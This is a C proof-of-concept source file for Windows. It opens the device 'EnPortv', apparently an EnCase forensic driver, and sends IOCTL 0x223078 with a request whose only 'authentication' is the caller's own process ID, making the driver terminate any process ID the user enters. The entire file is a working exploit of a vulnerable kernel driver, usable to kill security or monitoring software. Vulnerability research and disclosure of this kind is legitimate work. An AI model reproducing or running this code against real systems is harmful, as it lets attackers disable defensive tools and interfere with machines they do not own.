#include <stdio.h>
#include <windows.h>
#include <winnt.h>

// The correct IOCTL code found in the driver's command table
#define IOCTL_ENCASE_KILL_PROCESS 0x223078

#pragma pack(push, 1)
typedef struct _KILL_REQUEST {
    UINT64 CallingProcessId; // Bytes 0-7, must be the PID of this PoC.
    UINT64 TargetProcessId;  // Bytes 8-15, the PID of the process to terminate.
} KILL_REQUEST, *PKILL_REQUEST;
#pragma pack(pop)

int main(void) {
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    KILL_REQUEST request = { 0 };
    BOOL bResult = FALSE;
    DWORD bytesReturned = 0;

    const char* deviceName = "\\\\.\\EnPortv";

    hDevice = CreateFileA(
        deviceName,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to connect to the driver. Error: %lu\n", GetLastError());
        printf("    -> You MUST run this PoC from an Administrator command prompt.\n");
        getchar();
        return -1;
    }

    printf("[+] Successfully connected to %s\n", deviceName);
    printf("Enter the Process ID (PID) to terminate: ");
    
    if (scanf_s("%llu", &request.TargetProcessId) != 1) {
        printf("[-] Invalid input.\n");
        CloseHandle(hDevice);
        return -1;
    }

    // Set the "authentication" field to our own Process ID.
    request.CallingProcessId = GetCurrentProcessId();

    printf("[*] Sending IOCTL 0x%lX to terminate PID %llu...\n", IOCTL_ENCASE_KILL_PROCESS, request.TargetProcessId);
    printf("    (Using self-PID 0x%llX as authentication)\n", request.CallingProcessId);

    bResult = DeviceIoControl(
        hDevice,
        IOCTL_ENCASE_KILL_PROCESS,
        &request,
        sizeof(request), // Must be 16 bytes
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!bResult) {
        printf("[-] DeviceIoControl failed. Error: %lu\n", GetLastError());
    } else {
        printf("[+] IOCTL sent successfully. The process should be terminated.\n");
    }

    CloseHandle(hDevice);
    getchar();
    return 0;
}
